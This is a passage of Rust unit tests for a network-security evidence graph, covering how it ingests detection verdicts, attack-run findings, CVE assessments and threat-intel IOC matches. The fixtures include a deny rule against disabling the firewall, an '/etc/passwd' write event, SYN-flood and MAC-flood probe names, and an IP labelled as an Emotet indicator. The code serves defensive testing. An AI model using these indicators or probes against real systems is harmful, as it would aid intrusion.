            "SELECT src_ip FROM detections WHERE id=?", params![det_id2], |r| r.get(0)).unwrap();
        assert_eq!(src_ip_col2, "", "no src_ip in the feed -> empty column, same as before this fix");
        let edge_n2: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type='detects_on_device'", params![det_id2], |r| r.get(0)).unwrap();
        assert_eq!(edge_n2, 0, "graceful degradation: no src_ip -> no edge, not an error");

        // and this device-attributed DGA finding now auto-correlates into a per-device incident too.
        let n = g.correlate_all(0.0).unwrap();
        assert_eq!(n, 1, "only the src_ip-bearing verdict has a non-empty src_ip to correlate on");
    }

    #[test]
    fn ingest_aegis_verdict_reflex_skips_observe_links_device_for_jitter_and_above() {
        let g = EvidenceGraph::open_memory().unwrap();
        let observe = r#"{"mode":"reflex","ip":"192.168.1.1","score":0.2500,"level":"OBSERVE","response":"monitor","jitter_ms":0,"reason":"ip=192.168.1.1 Q=0.250 -> OBSERVE"}"#;
        assert!(g.ingest_aegis_verdict(observe).unwrap().is_none(), "OBSERVE is healthy baseline, not evidence");

        let jitter = r#"{"mode":"reflex","ip":"10.0.0.1","score":0.4500,"level":"JITTER","response":"add_jitter","jitter_ms":132,"reason":"fast rise dQ/dt=0.1200"}"#;
        let det_id = g.ingest_aegis_verdict(jitter).unwrap().expect("JITTER must ingest");
        let dev_id = sid("dev", "10.0.0.1");
        let linked: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type=? AND dst_id=?",
            params![det_id, "detects_on_device", dev_id], |r| r.get(0)).unwrap();
        assert_eq!(linked, 1, "reflex verdict must link to its device");
        let dev_exists: i64 = g.conn.query_row(
            "SELECT count(*) FROM devices WHERE id=?", params![dev_id], |r| r.get(0)).unwrap();
        assert_eq!(dev_exists, 1, "a device seen only via reflex must still get a node");

        let disconnect = r#"{"mode":"reflex","ip":"10.0.0.4","score":0.9000,"level":"DISCONNECT","response":"block_ip","jitter_ms":0,"reason":"ip=10.0.0.4 Q=0.900 -> DISCONNECT"}"#;
        let det_id2 = g.ingest_aegis_verdict(disconnect).unwrap().expect("DISCONNECT must ingest");
        let severity: i64 = g.conn.query_row(
            "SELECT severity FROM detections WHERE id=?", params![det_id2], |r| r.get(0)).unwrap();
        assert_eq!(severity, SEV_HIGH, "DISCONNECT must be the most severe reflex level (lowest number)");

        // idempotent re-ingest.
        g.ingest_aegis_verdict(jitter).unwrap();
        let n: i64 = g.conn.query_row("SELECT count(*) FROM detections", [], |r| r.get(0)).unwrap();
        assert_eq!(n, 2, "re-ingesting the same JITTER line must not duplicate it");
    }

    #[test]
    fn ingest_aegis_verdict_guard_skips_auto_apply_ingests_require_approval_and_deny() {
        let g = EvidenceGraph::open_memory().unwrap();
        let auto = r#"{"mode":"guard","action":"update_report","verdict":"AutoApply","reason":"Action permitted: no principle violations, within impact threshold."}"#;
        assert!(g.ingest_aegis_verdict(auto).unwrap().is_none(), "AutoApply is routine, not evidence");

        let approval = r#"{"mode":"guard","action":"full_quarantine","verdict":"RequireApproval","reason":"Action is in the confirmation-required set; human approval needed before execution."}"#;
        let det_id = g.ingest_aegis_verdict(approval).unwrap().expect("RequireApproval must ingest");
        let severity: i64 = g.conn.query_row(
            "SELECT severity FROM detections WHERE id=?", params![det_id], |r| r.get(0)).unwrap();
        assert_eq!(severity, SEV_LOW, "RequireApproval = LOW on the canonical scale");

        let deny = r#"{"mode":"guard","action":"disable_firewall","verdict":"Deny","reason":"Never disable firewall, IDS, DNS protection, or any security service","principle":"never_disable_protection"}"#;
        let det_id2 = g.ingest_aegis_verdict(deny).unwrap().expect("Deny must ingest");
        let (category, severity2, rule_msg): (String, i64, String) = g.conn.query_row(
            "SELECT category, severity, rule_msg FROM detections WHERE id=?", params![det_id2],
            |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?))).unwrap();
        assert_eq!(category, "aegis_guard");
        assert_eq!(severity2, SEV_MEDIUM, "Deny must outrank RequireApproval (lower = more severe)");
        assert!(rule_msg.contains("disable_firewall"));

        // no device edges at all for guard-mode lines (no ip in this shape).
        let (_, _, _, edges) = g.counts().unwrap();
        assert_eq!(edges, 0, "guard verdicts have no device to link");
    }

    #[test]
    fn ingest_qsecbit_score_attaches_to_self_device_and_is_idempotent() {
        let g = EvidenceGraph::open_memory().unwrap();
        let line = r#"{"score":0.5000,"band":"AMBER","drift":1.0000,"qdrift":1.0000,"p_attack":0.0000,"decay":0.0000,"maha_dist":6.3171,"entropy_nats":0.1780}"#;
        let qsb_id = g.ingest_qsecbit_score(line).unwrap().expect("qsecbit reading must ingest");

        let self_id = sid("dev", "self");
        let linked: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type=? AND dst_id=?",
            params![qsb_id, "qsecbit_score_of", self_id], |r| r.get(0)).unwrap();
        assert_eq!(linked, 1, "the score must attach to the self device node (the orb's backing node)");
        let self_exists: i64 = g.conn.query_row(
            "SELECT count(*) FROM devices WHERE id=?", params![self_id], |r| r.get(0)).unwrap();
        assert_eq!(self_exists, 1);

        let (band, score): (String, f64) = g.conn.query_row(
            "SELECT band, score FROM qsecbit_scores WHERE id=?", params![qsb_id],
            |r| Ok((r.get(0)?, r.get(1)?))).unwrap();
        assert_eq!(band, "AMBER");
        assert!((score - 0.5).abs() < 1e-9);

        // idempotent re-ingest of the identical reading (content-keyed id, no wall-clock ts in the id).
        g.ingest_qsecbit_score(line).unwrap();
        let n: i64 = g.conn.query_row("SELECT count(*) FROM qsecbit_scores", [], |r| r.get(0)).unwrap();
        assert_eq!(n, 1, "re-ingesting the identical reading must not duplicate it");

        // a genuinely different reading (e.g. next tick, GREEN) is a distinct node.
        let line2 = r#"{"score":0.0143,"band":"GREEN","drift":0.0018,"qdrift":0.0690,"p_attack":0.0000,"decay":0.0000,"maha_dist":0.1871,"entropy_nats":1.3102}"#;
        g.ingest_qsecbit_score(line2).unwrap();
        let n2: i64 = g.conn.query_row("SELECT count(*) FROM qsecbit_scores", [], |r| r.get(0)).unwrap();
        assert_eq!(n2, 2);
    }

    #[test]
    fn ingest_dns_aegis_qsecbit_ignore_unrelated_or_malformed_lines() {
        let g = EvidenceGraph::open_memory().unwrap();
        assert!(g.ingest_dns_verdict("not json").unwrap().is_none());
        assert!(g.ingest_dns_verdict(r#"{"type":"conn","src_ip":"1.2.3.4"}"#).unwrap().is_none());
        assert!(g.ingest_aegis_verdict("not json").unwrap().is_none());
        assert!(g.ingest_aegis_verdict(r#"{"mode":"unknown"}"#).unwrap().is_none());
        assert!(g.ingest_qsecbit_score("not json").unwrap().is_none());
        assert!(g.ingest_qsecbit_score(r#"{"foo":"bar"}"#).unwrap().is_none());
        let (_, _, det, edges) = g.counts().unwrap();
        assert_eq!(det, 0);
        assert_eq!(edges, 0);
    }

    // ---- ADR 0020 adversarial-resilience harness: attack_run / finding ingest ----

    #[test]
    fn ingest_attack_run_is_idempotent_and_upserts_the_final_verdict() {
        let g = EvidenceGraph::open_memory().unwrap();
        let pre_fire = r#"{"id":"ar:deadbeef:1","ts":"2026-07-05T18:00:00Z","roe_hash":"deadbeef",
            "cadence":"smoke","image_version":"0.0.0-test","dut_targets":["napse"],"operator":"ci",
            "verdict":"amber"}"#;
        let id = g.ingest_attack_run(pre_fire).unwrap().expect("attack_run must ingest");
        assert_eq!(id, "ar:deadbeef:1");
        let verdict: String = g.conn.query_row(
            "SELECT verdict FROM attack_runs WHERE id=?", params![&id], |r| r.get(0)).unwrap();
        assert_eq!(verdict, "amber", "the pre-fire record must land BEFORE any probe result exists");

        // the SAME id, overwritten with the final verdict (D3 contract #5's audit node).
        let final_run = pre_fire.replace("\"verdict\":\"amber\"", "\"verdict\":\"red\"");
        g.ingest_attack_run(&final_run).unwrap();
        let verdict2: String = g.conn.query_row(
            "SELECT verdict FROM attack_runs WHERE id=?", params![&id], |r| r.get(0)).unwrap();
        assert_eq!(verdict2, "red");
        let n: i64 = g.conn.query_row("SELECT count(*) FROM attack_runs", [], |r| r.get(0)).unwrap();
        assert_eq!(n, 1, "re-ingesting the same attack_run id must upsert, never duplicate");
    }

    #[test]
    fn ingest_finding_links_to_its_attack_run_and_records_breach() {
        let g = EvidenceGraph::open_memory().unwrap();
        let ar = r#"{"id":"ar:1","ts":"t","roe_hash":"h","cadence":"full","image_version":"v",
            "dut_targets":[],"operator":"ci","verdict":"red"}"#;
        g.ingest_attack_run(ar).unwrap();
        let finding = r#"{"id":"finding:ar:1:syn-flood","attack_run":"ar:1","ts":"2026-07-05T18:00:01Z",
            "layer":"l4","probe":"syn-flood-state-exhaustion","target_component":"napse-quarantine",
            "outcome":"breached","severity":"red","verified_fired":true,"evidence_ref":"resp:xyz",
            "mitre_attck":"T1499","repro_seed":42,"validates_adr":"0018"}"#;
        let fid = g.ingest_finding(finding).unwrap().expect("finding must ingest");
        assert_eq!(fid, "finding:ar:1:syn-flood");

        let linked: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id='ar:1' AND edge_type=? AND dst_id=?",
            params![EDGE_ATTACK_RUN_PRODUCED, &fid], |r| r.get(0)).unwrap();
        assert_eq!(linked, 1, "the finding must link back to its attack_run");

        let breached: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type=? AND dst_id='component:napse-quarantine'",
            params![&fid, EDGE_BREACHED], |r| r.get(0)).unwrap();
        assert_eq!(breached, 1, "a breached finding must record a `breached` edge to the defeated component");

        let adr_id = sid("adr", "0018");
        let validates: i64 = g.conn.query_row(
            "SELECT count(*) FROM edges WHERE src_id=? AND edge_type=? AND dst_id=?",
            params![&fid, EDGE_VALIDATES, adr_id], |r| r.get(0)).unwrap();
        assert_eq!(validates, 1, "validates_adr must record a `validates` edge to that ADR node");

        let stats = g.graph_stats().unwrap();
        assert!(stats.contains("\"attack_runs\":1"));
        assert!(stats.contains("\"findings\":1"));
    }

    #[test]
    fn ingest_finding_re_derives_unverified_as_inconclusive_never_trusts_the_claim() {
        // Even if an upstream producer LIES and claims "withstood", verified_fired=false must be
        // stored as inconclusive — the ingest path never trusts the claim over the bit that matters.
        let g = EvidenceGraph::open_memory().unwrap();
        g.ingest_attack_run(r#"{"id":"ar:2","ts":"t","roe_hash":"h","cadence":"smoke",
            "image_version":"v","dut_targets":[],"operator":"ci","verdict":"amber"}"#).unwrap();
        let finding = r#"{"id":"f:2","attack_run":"ar:2","ts":"t","layer":"l4","probe":"p",
            "target_component":"c","outcome":"withstood","severity":"red","verified_fired":false,
            "evidence_ref":"","repro_seed":1}"#;
        g.ingest_finding(finding).unwrap();
        let outcome: String = g.conn.query_row(
            "SELECT outcome FROM findings WHERE id='f:2'", [], |r| r.get(0)).unwrap();
        assert_eq!(outcome, "inconclusive", "unverified must be forced to inconclusive regardless of the JSON's claim");
    }

    #[test]
    fn ingest_finding_ignores_malformed_or_unrelated_lines() {
        let g = EvidenceGraph::open_memory().unwrap();
        assert!(g.ingest_finding("not json").unwrap().is_none());
        assert!(g.ingest_finding(r#"{"foo":"bar"}"#).unwrap().is_none());
        assert!(g.ingest_attack_run(r#"{"foo":"bar"}"#).unwrap().is_none());
        let n: i64 = g.conn.query_row("SELECT count(*) FROM findings", [], |r| r.get(0)).unwrap();
        assert_eq!(n, 0);
    }

    #[test]
    fn list_attack_runs_and_findings_for_run_are_read_only_and_correct() {
        let g = EvidenceGraph::open_memory().unwrap();
        g.ingest_attack_run(r#"{"id":"ar:3","ts":"t","roe_hash":"h","cadence":"smoke",
            "image_version":"v","dut_targets":["napse"],"operator":"ci","verdict":"pass"}"#).unwrap();
        g.ingest_finding(r#"{"id":"f:3a","attack_run":"ar:3","ts":"t","layer":"l2","probe":"mac-flood",
            "target_component":"napse-dpi","outcome":"withstood","severity":"amber",
            "verified_fired":true,"evidence_ref":"det:1","repro_seed":1}"#).unwrap();

        let runs_json = g.list_attack_runs(10).unwrap();
        assert!(runs_json.contains("\"ar:3\""));

        let findings_json = g.findings_for_run("ar:3").unwrap();
        let parsed: serde_json::Value = serde_json::from_str(&findings_json).unwrap();
        assert_eq!(parsed["count"], 1);
        assert_eq!(parsed["findings"][0]["id"], "f:3a");
        assert_eq!(parsed["findings"][0]["verified_fired"], true);
    }

    // ---- Mission Control read-API support methods (open_readonly + list_*/incident_detail/poll_since) ----

    /// `open_readonly` opens the SAME file the writer created, sees its data, and genuinely cannot
    /// write through it (SQLITE_OPEN_READ_ONLY at the OS/VFS layer, not just an unused method) —
    /// the exact guarantee the read-API depends on to never contend with the writer service.
    #[test]
    fn open_readonly_sees_writer_data_and_cannot_write() {
        let path = std::env::temp_dir().join(format!("hp-evidence-ro-test-{}.db", std::process::id()));
        std::fs::remove_file(&path).ok();
        {
            let w = EvidenceGraph::open(&path).unwrap();
            w.ingest_flow(r#"{"type":"conn","ts":1.0,"src_ip":"10.0.0.1","src_port":1,"dst_ip":"10.0.0.2","dst_port":80,"proto":"tcp","conn_state":"SF","orig_bytes":1,"resp_bytes":1}"#).unwrap();
        }
        let ro = EvidenceGraph::open_readonly(&path).unwrap();
        let (devices, flows, _, _) = ro.counts().unwrap();
        assert_eq!(devices, 1, "read-only handle must see the writer's committed data");
        assert_eq!(flows, 1);

        // any write attempt through the read-only handle must fail (SQLITE_READONLY), never silently
        // succeed and never panic.
        let err = ro.conn.execute("DELETE FROM flows", []).unwrap_err();
        eprintln!("expected read-only rejection: {err}");

        std::fs::remove_file(&path).ok();
    }

    /// 2026-07-09 additive-migration regression guard: a device that flashed an OLDER image (whose
    /// `evidence.db` predates the `files.sha256`/`applications.ja4`/`ja4s`/`ja4h` columns) must not
    /// break on next start — `migrate_additive_columns` must add them in place, on an
    /// ALREADY-CREATED `files`/`applications` table (where the `CREATE TABLE IF NOT EXISTS` in
    /// `SCHEMA` is a no-op), with zero data loss and zero errors.
    #[test]
    fn opening_a_pre_migration_db_backfills_the_new_columns_without_error() {
        let path = std::env::temp_dir().join(format!("hp-evidence-migration-test-{}.db", std::process::id()));
        std::fs::remove_file(&path).ok();
        {
            // Simulate an OLDER image's evidence.db: the pre-2026-07-09 `files`/`applications` shape,
            // built directly (not via EvidenceGraph::open, which would already create the new columns).
            let old = Connection::open(&path).unwrap();
            old.execute_batch(
                "CREATE TABLE files (id TEXT PRIMARY KEY, ts DOUBLE, device_ip TEXT, path TEXT, action TEXT); \
                 CREATE TABLE applications (id TEXT PRIMARY KEY, service TEXT, dst_port INTEGER, sni TEXT, \
                   http_host TEXT, ja3 TEXT, first_seen DOUBLE, last_seen DOUBLE); \
                 INSERT INTO files VALUES ('file:old', 1.0, '10.0.0.1', '/etc/passwd', 'write'); \
                 INSERT INTO applications VALUES ('app:old', 'tls', 443, 'old.example', '', 'deadbeef', 1.0, 1.0);"
            ).unwrap();
        }
        // Opening via the real path must not error, must preserve the pre-existing rows, AND must
        // have added the new columns (proven by successfully writing through them below).
        let g = EvidenceGraph::open(&path).unwrap();
        let old_path: String = g.conn.query_row(
            "SELECT path FROM files WHERE id='file:old'", [], |r| r.get(0)).unwrap();
        assert_eq!(old_path, "/etc/passwd", "pre-existing row must survive the migration untouched");
        let old_ja3: String = g.conn.query_row(
            "SELECT ja3 FROM applications WHERE id='app:old'", [], |r| r.get(0)).unwrap();
        assert_eq!(old_ja3, "deadbeef");

        let line = serde_json::json!({
            "type": "file", "ts": 2.0, "device_ip": "10.0.0.1", "path": "/tmp/new", "action": "write",
            "sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
        }).to_string();
        let fnode = g.ingest_host_event(&line).unwrap().expect("new file event ingests post-migration");
        let sha: String = g.conn.query_row(
            "SELECT sha256 FROM files WHERE id=?", params![fnode], |r| r.get(0)).unwrap();
        assert_eq!(sha, "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb");

        // Re-opening the SAME (now-migrated) DB a second time must be a no-op, not an error (the
        // "duplicate column name" swallow path).
        drop(g);
        let g2 = EvidenceGraph::open(&path).unwrap();
        let _ = g2.counts().unwrap();

        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn list_devices_flows_incidents_qsecbit_return_seeded_rows() {
        let g = EvidenceGraph::open_memory().unwrap();
        g.ingest_flow(r#"{"type":"conn","ts":10.0,"src_ip":"192.168.1.50","src_port":1,"dst_ip":"192.168.1.1","dst_port":22,"proto":"tcp","conn_state":"S0","orig_bytes":0,"resp_bytes":0}"#).unwrap();
        g.ingest_detection(r#"{"ts":10.0,"rule_id":1,"rule_msg":"test","category":"port_scan","severity":2,"mitre":"T1046","src_ip":"192.168.1.50","dst_ip":"192.168.1.1","dst_port":22,"confidence":0.8}"#).unwrap();
        let inc_id = g.correlate_incident("192.168.1.50", "Test incident").unwrap();
        g.ingest_qsecbit_score(r#"{"score":0.9,"band":"GREEN","drift":0.0,"qdrift":0.0,"p_attack":0.0,"decay":0.0,"maha_dist":0.0,"entropy_nats":0.0}"#).unwrap();

        // 2 devices: the LAN device from the flow, plus the synthetic "self" device the qsecbit
        // ingest attaches its score to (ingest_qsecbit_score's documented design — see its doc comment).
        let devices: serde_json::Value = serde_json::from_str(&g.list_devices(10).unwrap()).unwrap();
        assert_eq!(devices["count"], 2);
        let ips: Vec<&str> = devices["devices"].as_array().unwrap().iter().map(|d| d["ip"].as_str().unwrap()).collect();
        assert!(ips.contains(&"192.168.1.50"));

        let flows: serde_json::Value = serde_json::from_str(&g.list_flows(10).unwrap()).unwrap();
        assert_eq!(flows["count"], 1);

        let incidents: serde_json::Value = serde_json::from_str(&g.list_incidents(10).unwrap()).unwrap();
        assert_eq!(incidents["count"], 1);
        assert_eq!(incidents["incidents"][0]["id"], inc_id);

        let scores: serde_json::Value = serde_json::from_str(&g.list_qsecbit(10).unwrap()).unwrap();
        assert_eq!(scores["count"], 1);
        assert_eq!(scores["scores"][0]["band"], "GREEN");
    }

    #[test]
    fn detections_by_categories_filters_dns_and_aegis_verdicts() {
        let g = EvidenceGraph::open_memory().unwrap();
        g.ingest_dns_verdict(r#"{"domain":"evil.example","verdict":"malicious","score":0.95,"reasons":["dga"]}"#).unwrap();
        g.ingest_aegis_verdict(r#"{"mode":"reflex","ip":"10.0.0.9","level":"SHADOW","score":0.7,"response":"shadow-ban"}"#).unwrap();
        g.ingest_detection(r#"{"ts":1.0,"rule_id":1,"rule_msg":"unrelated","category":"port_scan","severity":1,"src_ip":"1.1.1.1","dst_ip":"2.2.2.2","dst_port":80,"confidence":0.5}"#).unwrap();

        let dns: serde_json::Value = serde_json::from_str(&g.detections_by_categories(&["dns_dga"], 10).unwrap()).unwrap();
        assert_eq!(dns["count"], 1);
        assert_eq!(dns["detections"][0]["category"], "dns_dga");

        let aegis: serde_json::Value = serde_json::from_str(&g.detections_by_categories(&["aegis_reflex", "aegis_guard"], 10).unwrap()).unwrap();
        assert_eq!(aegis["count"], 1);
        assert_eq!(aegis["detections"][0]["category"], "aegis_reflex");
    }

    #[test]
    fn incident_detail_returns_explanation_envelope_and_none_for_unknown_id() {
        let g = EvidenceGraph::open_memory().unwrap();
        // rule_id 1000041 = lateral::LATERAL_RULE_ID — not 1000009 (a different, real, in-use rule).
        g.ingest_detection(r#"{"ts":5.0,"rule_id":1000041,"rule_msg":"Lateral Movement","category":"lateral_movement","severity":3,"mitre":"T1021","src_ip":"10.0.0.5","dst_ip":"10.0.0.9","dst_port":445,"confidence":0.9}"#).unwrap();
        let inc_id = g.correlate_incident("10.0.0.5", "Lateral movement").unwrap();

        let detail = g.incident_detail(&inc_id).unwrap().expect("incident exists");
        let v: serde_json::Value = serde_json::from_str(&detail).unwrap();
        assert_eq!(v["id"], inc_id);
        assert_eq!(v["title"], "Lateral movement");
        // threat_score = (6 - worst severity)/5 = (6-3)/5 = 0.6 -> confidence 60 (severity 3 = MEDIUM)
        assert_eq!(v["explanation"]["confidence"], 60.0);
        assert!(v["explanation"]["model"].is_null(), "no AI planner has run — model must be null, never fabricated");
        assert!(v["explanation"]["evidence"].as_i64().unwrap() > 0);
        assert!(!v["attack_path"]["nodes"].as_array().unwrap().is_empty());

        assert!(g.incident_detail("inc:doesnotexist").unwrap().is_none());
    }

    /// ADR 0025 (AEGIS BYO-LLM planner): `record_ai_explanation` is the ONLY writer of `model` —
    /// before it runs, `model`/`ai_reasoning` are honestly null with a reason string; after it
    /// runs, both populate from the SAME row, and the deterministic `why`/`confidence`/`evidence`
    /// fields are completely unaffected (they are never overwritten by the planner).
    #[test]
    fn record_ai_explanation_populates_model_and_ai_reasoning_after_a_planner_run() {
        let g = EvidenceGraph::open_memory().unwrap();
        g.ingest_detection(r#"{"ts":5.0,"rule_id":1000003,"rule_msg":"Port Scan","category":"port_scan","severity":2,"mitre":"T1046","src_ip":"203.0.113.9","dst_ip":"192.168.1.5","dst_port":22,"confidence":0.8}"#).unwrap();
        let inc_id = g.correlate_incident("203.0.113.9", "Port scan incident").unwrap();

        // Before any planner run: honest null + reason string, deterministic fields untouched.
        let before: serde_json::Value = serde_json::from_str(&g.incident_detail(&inc_id).unwrap().unwrap()).unwrap();
        assert!(before["explanation"]["model"].is_null());
        assert_eq!(before["explanation"]["ai_reasoning"]["reason"], "no AI planner run / no model configured");
        let deterministic_why = before["explanation"]["why"].clone();
        let deterministic_confidence = before["explanation"]["confidence"].clone();

        // record_ai_explanation silently no-ops for an unknown incident — never fabricates one.
        assert!(g.record_ai_explanation(r#"{"incident_id":"inc:doesnotexist","model":"http://localhost:11434/v1::llama3.1:8b","why":"x","confidence":80,"reasoning":"y"}"#).unwrap().is_none());

        let line = format!(
            r#"{{"incident_id":"{inc_id}","model":"http://localhost:11434/v1::llama3.1:8b","why":"a port scan from a single source against SSH","confidence":88,"reasoning":"the model's full reasoning text"}}"#
        );
        let written = g.record_ai_explanation(&line).unwrap();
        assert!(written.is_some(), "a valid line against a real incident must record a row");

        let after: serde_json::Value = serde_json::from_str(&g.incident_detail(&inc_id).unwrap().unwrap()).unwrap();
        assert_eq!(after["explanation"]["model"], "http://localhost:11434/v1::llama3.1:8b");
        assert_eq!(after["explanation"]["ai_reasoning"]["why"], "a port scan from a single source against SSH");
        assert_eq!(after["explanation"]["ai_reasoning"]["confidence"], 88.0);
        assert_eq!(after["explanation"]["ai_reasoning"]["reasoning"], "the model's full reasoning text");
        // the deterministic explanation fields are byte-for-byte unaffected by the planner run.
        assert_eq!(after["explanation"]["why"], deterministic_why);
        assert_eq!(after["explanation"]["confidence"], deterministic_confidence);

        // a second run (re-explain) records a NEW row and incident_detail serves the latest one.
        let line2 = format!(
            r#"{{"incident_id":"{inc_id}","model":"https://api.openai.com/v1::gpt-4o-mini","why":"updated reasoning","confidence":95,"reasoning":"refined"}}"#
        );
        g.record_ai_explanation(&line2).unwrap();
        let after2: serde_json::Value = serde_json::from_str(&g.incident_detail(&inc_id).unwrap().unwrap()).unwrap();
        assert_eq!(after2["explanation"]["model"], "https://api.openai.com/v1::gpt-4o-mini");
        assert_eq!(after2["explanation"]["ai_reasoning"]["why"], "updated reasoning");
    }

    #[test]
    fn poll_since_returns_only_new_activity_and_advances_watermark() {
        let g = EvidenceGraph::open_memory().unwrap();
        g.ingest_detection(r#"{"ts":100.0,"rule_id":1,"rule_msg":"old","category":"port_scan","severity":1,"src_ip":"1.1.1.1","dst_ip":"2.2.2.2","dst_port":80,"confidence":0.5}"#).unwrap();

        // nothing newer than ts=100 yet
        let (wm1, json1) = g.poll_since(100.0).unwrap();
        let v1: serde_json::Value = serde_json::from_str(&json1).unwrap();
        assert_eq!(v1["detections"].as_array().unwrap().len(), 0, "no activity strictly AFTER the watermark");
        assert_eq!(wm1, 100.0);

        // a new detection lands after the last poll
        g.ingest_detection(r#"{"ts":200.0,"rule_id":2,"rule_msg":"new","category":"port_scan","severity":2,"src_ip":"1.1.1.1","dst_ip":"2.2.2.2","dst_port":80,"confidence":0.9}"#).unwrap();
        let (wm2, json2) = g.poll_since(wm1).unwrap();
        let v2: serde_json::Value = serde_json::from_str(&json2).unwrap();
        assert_eq!(v2["detections"].as_array().unwrap().len(), 1, "the new detection must appear exactly once");
        assert_eq!(v2["detections"][0]["rule_msg"], "new");
        assert_eq!(wm2, 200.0, "watermark advances to the newest activity ts");

        // polling again at the new watermark with no further activity returns nothing new
        let (wm3, json3) = g.poll_since(wm2).unwrap();
        let v3: serde_json::Value = serde_json::from_str(&json3).unwrap();
        assert_eq!(v3["detections"].as_array().unwrap().len(), 0);
        assert_eq!(wm3, wm2);
    }

    #[test]
    fn ingest_vex_finding_creates_cve_and_assessment_nodes_and_lists() {
        let g = EvidenceGraph::open_memory().unwrap();
        // an AFFECTED (reachable) CVE → links CVE to dev:self; a NOT_AFFECTED one → does not.
        let affected = r#"{"cve":"CVE-2024-6387","component":"openssh","component_version":"9.6p1",
            "summary":"regreSSHion","published":"2024-07-01","cvss":8.1,"epss":0.94,"kev":true,
            "status":"affected","justification":null,"impact_statement":"reachable","action_statement":"act now",
            "ssvc":"act","ssvc_reason":"KEV+reachable","exploitation":"active","exposed":true,"fixed_version":"9.8p1"}"#;
        let not_affected = r#"{"cve":"CVE-2024-1002","component":"onnxruntime","component_version":"1.17.0",
            "summary":"onnx overflow","published":"2024-03-01","cvss":8.8,"epss":0.42,"kev":false,
            "status":"not_affected","justification":"vulnerable_code_not_in_execute_path",
            "impact_statement":"edge_ai not granted","action_statement":"","ssvc":"defer","ssvc_reason":"not reachable",
            "exploitation":"poc","exposed":false,"fixed_version":null}"#;
        let vex_id = g.ingest_vex_finding(affected).unwrap().unwrap();
        assert!(vex_id.starts_with("vex:"));
        g.ingest_vex_finding(not_affected).unwrap();
        // idempotent re-ingest.
        g.ingest_vex_finding(affected).unwrap();

        let list: serde_json::Value = serde_json::from_str(&g.list_exploitability(50).unwrap()).unwrap();
        let findings = list["findings"].as_array().unwrap();
        assert_eq!(findings.len(), 2, "two distinct CVE assessments, no dupes on re-ingest");
        // act sorts before defer.
        assert_eq!(findings[0]["cve"], "CVE-2024-6387");
        assert_eq!(findings[0]["ssvc"], "act");
        assert_eq!(list["summary"]["act"], 1);
        assert_eq!(list["summary"]["not_affected"], 1);
        assert_eq!(list["summary"]["affected"], 1);

        // the AFFECTED CVE reaches dev:self in the graph; the NOT_AFFECTED one must not.
        let self_id = sid("dev", "self");
        let sub: serde_json::Value = serde_json::from_str(&g.attack_path(&self_id).unwrap()).unwrap();
        let ids: Vec<&str> = sub["nodes"].as_array().unwrap().iter().filter_map(|n| n["id"].as_str()).collect();
        let affected_cve = sid("cve", "CVE-2024-6387:openssh:9.6p1");
        let not_affected_cve = sid("cve", "CVE-2024-1002:onnxruntime:1.17.0");
        assert!(ids.contains(&affected_cve.as_str()), "affected CVE linked to dev:self");
        assert!(!ids.contains(&not_affected_cve.as_str()), "not_affected CVE not shown as device-vulnerable");
    }

    // ---- HYDRA IOC-match enrichment (ADR 0027) ------------------------------------------------

    // Test-only fixture builder — deliberately mirrors the real HYDRA line's full field set 1:1
    // (readability for the reader diffing against `to_ioc_match_json`'s output beats trimming args).
    #[allow(clippy::too_many_arguments)]
    fn ioc_match_line(ts: f64, rule_id: i64, indicator: &str, ioc_type: &str, family: &str, src_ip: &str, dst_ip: &str, dst_port: i64, confidence: f64) -> String {
        format!(
            "{{\"ts\":{ts},\"rule_id\":{rule_id},\"rule_msg\":\"HYDRA IOC match: {indicator}\",\"category\":\"threat_intel\",\"severity\":2,\"mitre\":\"T1071\",\"src_ip\":\"{src_ip}\",\"dst_ip\":\"{dst_ip}\",\"dst_port\":{dst_port},\"confidence\":{confidence},\"indicator\":\"{indicator}\",\"ioc_type\":\"{ioc_type}\",\"ioc_family\":\"{family}\"}}"
        )
    }

    #[test]
    fn ingest_ioc_match_creates_detection_and_iocs_row_and_seen_on_edge() {
        let g = EvidenceGraph::open_memory().unwrap();
        // outbound match: our own LAN device (10.66.0.20) reached a known-bad indicator dst_ip.
        let line = ioc_match_line(100.0, 4_000_000_001, "162.243.103.246", "ip", "Emotet", "10.66.0.20", "162.243.103.246", 8080, 0.9);
        let det_id = g.ingest_ioc_match(&line).unwrap().expect("valid ioc-match line ingests");
        assert!(det_id.starts_with("det:"));

        // the iocs table has exactly one row, hits=1.
        let (indicator, ioc_type, family, hits): (String, String, String, i64) = g.conn.query_row(
            "SELECT indicator, ioc_type, family, hits FROM iocs", [], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?)),
        ).unwrap();
        assert_eq!(indicator, "162.243.103.246");
        assert_eq!(ioc_type, "ip");
        assert_eq!(family, "Emotet");
        assert_eq!(hits, 1);

        // the ioc node is edged to the new detection (enriched_by) and to the LAN device that made
        // the connection (ioc_seen_on) — never to the indicator's own value.
        let ioc_id = sid("ioc", "162.243.103.246");
        let dev_id = sid("dev", "10.66.0.20");
        let bad_dev_id = sid("dev", "162.243.103.246"); // must NOT exist as a device edge target
        let edges: Vec<(String, String, String)> = {
            let mut stmt = g.conn.prepare("SELECT src_id, edge_type, dst_id FROM edges").unwrap();
            stmt.query_map([], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?))).unwrap().filter_map(|r| r.ok()).collect()
        };
        assert!(edges.contains(&(det_id.clone(), "enriched_by".to_string(), ioc_id.clone())));
        assert!(edges.contains(&(ioc_id.clone(), "ioc_seen_on".to_string(), dev_id)));
        assert!(!edges.iter().any(|(_, ty, dst)| ty == "ioc_seen_on" && dst == &bad_dev_id));

        // re-ingest (idempotent-ish): a SECOND sighting of the same indicator bumps hits, doesn't duplicate the row.
        g.ingest_ioc_match(&ioc_match_line(200.0, 4_000_000_001, "162.243.103.246", "ip", "Emotet", "10.66.0.21", "162.243.103.246", 8080, 0.9)).unwrap();
